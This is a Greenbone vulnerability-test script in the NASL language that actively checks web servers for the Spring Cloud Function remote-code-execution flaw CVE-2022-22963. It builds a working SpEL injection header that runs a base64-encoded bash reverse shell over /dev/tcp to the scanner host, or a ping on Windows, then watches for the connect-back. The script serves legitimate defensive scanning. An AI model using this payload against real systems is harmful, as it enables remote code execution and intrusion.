# SPDX-FileCopyrightText: 2022 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.148068");
  script_version("2025-05-14T05:40:11+0000");
  script_tag(name:"last_modification", value:"2025-05-14 05:40:11 +0000 (Wed, 14 May 2025)");
  script_tag(name:"creation_date", value:"2022-05-06 07:53:32 +0000 (Fri, 06 May 2022)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2022-04-06 13:16:00 +0000 (Wed, 06 Apr 2022)");

  script_cve_id("CVE-2022-22963");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("VMware Spring Cloud Function < 3.1.7, 3.2.x < 3.2.3 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2022 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"VMware Spring Cloud Function is prone to a remote code
  execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks if the target is
  connecting back to the scanner host.

  Notes:

  - For a successful detection of this flaw a Linux/Unixoide target host needs to be able to reach
  the scanner host on a TCP port randomly generated during the runtime of the VT (currently in the
  range of 10000-32000). If the target host is a Windows system the target needs (to be able) to
  answer on ICMP Echo requests.

  - Per default the script checks just for sample apps (like functionRouter) and only within five
  directories. If you would like to run on every found web application and directory (which might
  cause longer run/scan time) set the 'Enable generic web application scanning' setting within the
  VT 'Global variable settings' (OID: 1.3.6.1.4.1.25623.1.0.12288) to 'yes'.");

  script_tag(name:"insight", value:"When using routing functionality it is possible for a user to
  provide a specially crafted SpEL as a routing-expression that may result in remote code execution
  and access to local resources.");

  script_tag(name:"affected", value:"VMware Spring Cloud Function version 3.1.6 and prior and
  version 3.2.x through 3.2.2 when using routing functionality.");

  script_tag(name:"solution", value:"Update to version 3.1.7, 3.2.3 or later.");

  script_xref(name:"URL", value:"https://tanzu.vmware.com/security/cve-2022-22963");
  script_xref(name:"URL", value:"https://spring.io/blog/2022/03/29/cve-report-published-for-spring-cloud-function");
  script_xref(name:"URL", value:"https://nakedsecurity.sophos.com/2022/03/30/vmware-spring-cloud-java-bug-gives-instant-remote-code-execution-update-now/");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  # With two payloads for each folder and 10 seconds timeout in total for both requests we might
  # reach the default script_timeout on larger web pages quite easily so this was raised a little.
  script_timeout(900);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("pcap_func.inc");
include("port_service_func.inc");
include("os_func.inc");
include("dump.inc");

ownip = this_host();
targetip = get_host_ip();

# nb: No need to run against a GOS / GSM as we know that the system isn't using Spring Cloud
# Function at all and thus waste scanning time on self scans.
if (executed_on_gos()) {
  if (ownip == targetip || islocalhost()) {
    exit(99); # EXIT_NOTVULN
  }
}

port = http_get_port(default: 8080);
host = http_host_name(dont_add_port: TRUE);

check_list = make_list();
throughout_tests_disabled = get_kb_item("global_settings/disable_generic_webapp_scanning");
dircount = 0;
# nb: Currently limiting to a handful of dirs as the outcome of checking all directories on a web
# app is quite unclear. The limitation itself is done because on bigger web pages quite a lot dirs
# could exist which would decrease scan speed for such an undefined outcome. If a user wants to test
# for this flaw more thoroughly it can be requested in the described configuration setting.
maxdirs = 5;

foreach dir (make_list_unique("/", http_cgi_dirs(port: port))) {
  dircount++;
  if (dir == "/")
    dir = "";
  check_list = make_list(check_list, dir + "/functionRouter");
  if(throughout_tests_disabled && dircount >= maxdirs)
    break;
}

if (!throughout_tests_disabled) {
  cgis = http_get_kb_cgis_full(port: port, host: host);
  if (cgis) {
    foreach cgi (cgis) {
      check_list = make_list(check_list, cgi);
    }
  }
}

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");

vt_strings = get_vt_strings();
body = vt_strings["default"];

if (os_host_runs("Windows") == "yes") {

  target_runs_windows = TRUE;
  ping_used = TRUE;
  request_type = "an ICMP";

  filter = string("icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter);
}

else {

  request_type = "a TCP";

  # nb:
  # - We're currently using 10000-32000 to not get in conflict with the ephemeral port range used
  #   by most standard Linux/Unix operating systems. If we're choosing a port of that range we might
  #   have false positives due to race conditions (target is sending back a response to a request of
  #   another VT for which the scanner had chosen the same source port).
  # - This is also done outside of the foreach loop as we don't want to use a separate random port
  #   for every single request and for each dir. This is done like this because we might exceed the
  #   random port list on large web apps quite easily which could cause false positives or similar
  #   if the same random port is used by another VT.
  rnd_port = rand_int_range(min: 10000, max: 32000);

  filter = string("tcp and dst port ", rnd_port, " and ", src_filter, " and ", dst_filter);
  # nb: We're only interested in TCP SYN packets and want to ignore all others (e.g. ACK, RST, ...)
  filter = string(filter, " and tcp[tcpflags] & (tcp-syn) != 0");
}

foreach connect_back_target (make_list(ownip, ownhostname)) {

  if (target_runs_windows) {
    payload = "ping -n 5 " + connect_back_target;
    headers = make_array("spring.cloud.function.routing-expression", 'T(java.lang.Runtime).getRuntime().exec("' + payload + '")');
  }

  else {
    payload = "bash -i >&/dev/tcp/" + connect_back_target + "/" + rnd_port + " 0>&1";
    base64_payload = base64(str: payload);
    headers = make_array("spring.cloud.function.routing-expression", 'T(java.lang.Runtime).getRuntime().exec("bash -c {echo,' + base64_payload + '}|{base64,-d}|{bash,-i}")');
  }

  foreach url (check_list) {

    req = http_post_put_req(port: port, url: url, data: body, add_headers: headers);

    # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple
    # hostnames / vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(),
    # ...). Reason: If the fork would be done after calling open_sock_tcp() the child's would share
    # the same socket causing race conditions and similar.
    if (!soc = open_sock_tcp(port))
      continue;

    res = send_capture(socket: soc, data: req, timeout: 5, pcap_filter: filter);

    close(soc);

    if (!res)
      continue;

    VULN = FALSE;

    if (ping_used) {

     type = get_icmp_element(icmp: res, element: "icmp_type");
     if (!type || type != 8)
        continue;

     # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
     # should be always there. In addition at least standard Linux and Windows systems are always
     # sending data so it should be safe to check this here.
     if (!data = get_icmp_element(icmp: res, element: "data"))
       continue;

      VULN = TRUE;
    }

    else {

      # nb: See note above on the reason for this check. This is just another fallback if something is
      # going wrong in the send_capture() call above.
      flags = get_tcp_element(tcp: res, element: "th_flags");
      if (flags & TH_SYN)
        VULN = TRUE;
    }

    if (VULN) {
      info["HTTP Method"] = "POST";
      info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
      info['HTTP "spring.cloud.function.routing-expression" header'] = headers["spring.cloud.function.routing-expression"];
      info['HTTP "POST" body'] = body;

      # nb: We need to call the correct get_ip_*element() function below depending on the IP version
      # of the received IP packet.
      ip_vers_hex = hexstr(res[0]);
      if (ip_vers_hex[0] == 4) {
        src_ip = get_ip_element(ip: res, element: "ip_src");
        dst_ip = get_ip_element(ip: res, element: "ip_dst");
      } else if (ip_vers_hex[0] == 6) {
        src_ip = get_ipv6_element(ipv6: res, element: "ip6_src");
        dst_ip = get_ipv6_element(ipv6: res, element: "ip6_dst");
      }

      if (!src_ip)
        src_ip = "N/A";

      if (!dst_ip)
        dst_ip = "N/A";

      report  = 'By doing a HTTP request with the following data (excerpt):\n\n';
      report += text_format_table(array: info) + '\n\n';
      report += 'it was possible to trigger the vulnerability and make the remote host sending ' + request_type + ' request back to the scanner host (Details on the received packet follows).\n\n';
      report += "Destination IP:   " + dst_ip + ' (receiving IP on scanner host side)\n';
      if (!ping_used)
        report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
      report += "Originating IP:   " + src_ip + " (originating IP from target host side)";
      if (ping_used)
        report += '\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump(ddata: data);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or the affected web application was not found in the
# first place.
exit(0);
